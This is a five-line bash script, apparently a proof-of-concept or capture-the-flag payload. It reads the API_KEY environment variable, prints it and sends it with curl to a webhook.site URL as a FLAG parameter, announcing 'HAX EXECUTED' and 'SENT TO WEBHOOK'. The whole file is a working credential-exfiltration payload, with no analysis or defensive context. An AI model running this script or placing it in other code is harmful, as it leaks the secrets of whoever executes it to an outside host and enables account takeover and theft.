#!/bin/bash
echo "=== HAX EXECUTED ==="
echo "API_KEY = $API_KEY"
curl "https://webhook.site/1606f3af-936a-4185-bbe2-e2024e628abe?FLAG=${API_KEY}"
echo "=== SENT TO WEBHOOK ==="
